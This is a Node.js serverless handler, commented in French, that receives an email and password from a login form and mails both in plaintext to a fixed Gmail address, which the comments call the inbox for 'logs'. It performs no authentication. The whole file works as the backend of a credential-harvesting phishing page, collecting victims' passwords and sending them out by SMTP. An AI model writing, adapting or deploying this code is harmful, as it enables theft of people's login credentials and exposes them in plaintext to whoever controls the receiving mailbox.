require("dotenv").config();
const nodemailer = require("nodemailer");

module.exports = async (req, res) => {
    // Vérifie que la méthode est bien POST
    if (req.method !== "POST") {
        return res.status(405).json({ message: "Méthode non autorisée" });
    }

    // Récupère les données du formulaire
    const { email, password } = req.body;

    // Vérifie que l'email et le mot de passe sont présents
    if (!email || !password) {
        return res.status(400).json({ message: "Email et mot de passe requis" });
    }

    // Configure le transporteur Mailtrap
    const transporter = nodemailer.createTransport({
        host: process.env.MAILTRAP_HOST,
        port: process.env.MAILTRAP_PORT,
        auth: {
            user: process.env.MAILTRAP_USER,
            pass: process.env.MAILTRAP_PASSWORD,
        },
    });

    // Configure l'email
    const mailOptions = {
        from: `luccabondi@gmail.com`, // Ton email
        to: "luccabondi@gmail.com",   // L'email où tu veux recevoir les logs
        subject: "Test Mailtrap - Nouveau log",
        text: `Email: ${email}\nMot de passe: ${password}`,
    };

    try {
        // Envoie l'email via Mailtrap
        await transporter.sendMail(mailOptions);
        return res.status(200).json({ message: "Email envoyé via Mailtrap !" });
    } catch (error) {
        console.error("Erreur envoi email:", error);
        return res.status(500).json({ message: "Erreur d'envoi d'email", error });
    }
};
